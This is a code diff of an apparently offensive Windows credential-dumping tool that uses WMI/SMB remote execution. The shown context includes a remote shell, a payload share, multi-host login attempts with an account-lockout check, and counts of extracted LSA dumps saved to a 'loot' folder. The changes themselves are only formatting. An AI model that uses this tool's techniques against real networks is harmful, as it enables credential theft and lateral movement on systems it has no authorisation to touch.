@@ -359,7 +359,7 @@ class WMIEXEC:
 
             self.shell = RemoteShell(self.__share, win32Process, smbConnection, self.__shell_type, silentCommand)
             self.shell.onecmd(self.__command)
-        except  (Exception, KeyboardInterrupt) as e:
+        except (Exception, KeyboardInterrupt) as e:
             if logging.getLogger().level == logging.DEBUG:
                 import traceback
                 traceback.print_exc()
@@ -812,15 +812,12 @@ def auto_drive(addresses, domain): # really helpful so you dont have to know whi
                     f.write('{}: {}\n'.format(addresses[x], str(e)))
                     f.close()
 
-                if str(e).find(
-                        'STATUS_LOGON_FAILURE') != -1 and options.localauth == False:  # way to track failed logins to see if they're gonna lock the account out
+                if str(e).find('STATUS_LOGON_FAILURE') != -1 and options.localauth == False:  # way to track failed logins to see if they're gonna lock the account out
                     logging.error('{}: {}'.format(addresses[x], str(e)))
                     failed_logons += 1
 
                 if failed_logons >= 3 and options.localauth == False:
-                    cont = input(
-                        '{}[!]{} Warning you got the user\'s password wrong on {} machines, you may lock the account out if the password is incorrect and you continue, please validate the password! Do you wish to continue? (y/N) '.format(
-                            color_YELL, color_reset, failed_logons))
+                    cont = input('{}[!]{} Warning you got the user\'s password wrong on {} machines, you may lock the account out if the password is incorrect and you continue, please validate the password! Do you wish to continue? (y/N) '.format(color_YELL, color_reset, failed_logons))
                     if cont.lower() == 'n':
                         print("\n{}[!]{} Cleaning up please wait".format(color_YELL, color_reset))
                         try:
@@ -852,12 +849,10 @@ def auto_drive(addresses, domain): # really helpful so you dont have to know whi
                             os.system("sudo mv /var/tmp/{} {}/loot/'{}'".format(share_name, cwd, timestamp))
                         except BaseException as e:
                             pass
-                        print(
-                            "{}[-]{} Cleanup completed!  If the program does not automatically exit press CTRL + C".format(
-                                color_BLU, color_reset))
+                        print("{}[-]{} Cleanup completed!  If the program does not automatically exit press CTRL + C".format(color_BLU, color_reset))
                         exit(0)
                 continue
-            #end of antilocout check
+            # end of antilocout check
 
     if os.path.isfile('{}/drives.txt'.format(cwd)): # incase they run with localauth to prevent file not found err
         os.system('sudo rm {}/drives.txt'.format(cwd))
@@ -943,7 +938,7 @@ if __name__ == '__main__':
         print("[!] This program is Linux only")
         exit(1)
 
-    if (os.path.isdir(cwd + "/loot") == False):
+    if os.path.isdir(cwd + "/loot") == False:
         os.makedirs(cwd + "/loot")
 
     print(reaper_banner)
@@ -967,8 +962,7 @@ if __name__ == '__main__':
                                                        'map the result with '
                                                        'https://docs.python.org/3/library/codecs.html#standard-encodings and then execute wmiexec.py '
                                                        'again with -codec and the corresponding codec ' % CODEC)
-    parser.add_argument('-com-version', action='store', metavar="MAJOR_VERSION:MINOR_VERSION",
-                        help='DCOM version, format is MAJOR_VERSION:MINOR_VERSION e.g. 5.7')
+    parser.add_argument('-com-version', action='store', metavar="MAJOR_VERSION:MINOR_VERSION", help='DCOM version, format is MAJOR_VERSION:MINOR_VERSION e.g. 5.7')
 
     group = parser.add_argument_group('authentication')
     group.add_argument('-localauth', action='store_true', default = False, help='Authenticate with a local account to the machine')
@@ -1080,7 +1074,7 @@ if __name__ == '__main__':
             if local_ip in ifaces:
                 local_ip = str(ni.ifaddresses(local_ip)[ni.AF_INET][0]['addr'])
                 print("local IP => " + local_ip)
-                
+
         if '-oe' not in sys.argv: # why scan if we not gonna do anything
             addresses = do_ip(address) # gets a list of up hosts
             try:
@@ -1097,7 +1091,7 @@ if __name__ == '__main__':
         share_name, share_user, share_pass, payload_name, share_group = setup_share() # creates and starts our share
         print("\n[share-info]\nShare location: /var/tmp/{}\nUsername: {}\nPassword: {}\n".format(share_name, share_user,share_pass))
 
-        #automatically find the best drive to use
+        # automatically find the best drive to use
         if options.drive is None and options.method == 'wmiexec' and options.oe == False:
             drive_letter = auto_drive(addresses, domain)
 
@@ -1140,7 +1134,7 @@ if __name__ == '__main__':
         with open('{}/log.txt'.format(cwd), 'a') as f:
             f.write('Extracted LSA: {}/{}\n'.format(len([name for name in os.listdir("{}/loot/{}".format(cwd, timestamp)) if os.path.isfile(os.path.join("{}/loot/{}".format(cwd, timestamp), name))])-1, len(addresses)))
             f.close()
-        #for when you're attacking a lot of targets to quickly see how many we got
+        # for when you're attacking a lot of targets to quickly see how many we got
         print('\n{} Total Extracted LSA: {}/{}\n'.format(green_plus, len([name for name in os.listdir("{}/loot/{}".format(cwd, timestamp)) if os.path.isfile(os.path.join("{}/loot/{}".format(cwd, timestamp), name))])-1, len(addresses)))
 
         if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
@@ -1155,7 +1149,6 @@ if __name__ == '__main__':
             remove_files = input('\nWould you like to delete the .dmp files now? (Y/n) ')
             if remove_files.lower() == 'y':
                 os.system('sudo rm {}/loot/{}/*.dmp'.format(cwd, timestamp))
-
 
     except KeyboardInterrupt as e:
         logging.error(str(e))
@@ -1195,7 +1188,6 @@ if __name__ == '__main__':
             pass
         print("{}[-]{} Cleanup completed!  If the program does not automatically exit press CTRL + C".format(color_BLU, color_reset))
         exit(0)
-
 
     print("{}[-]{} Cleaning up please wait".format(color_BLU, color_reset))
     if os.path.isfile('{}/drives.txt'.format(cwd)): # cleanup that file
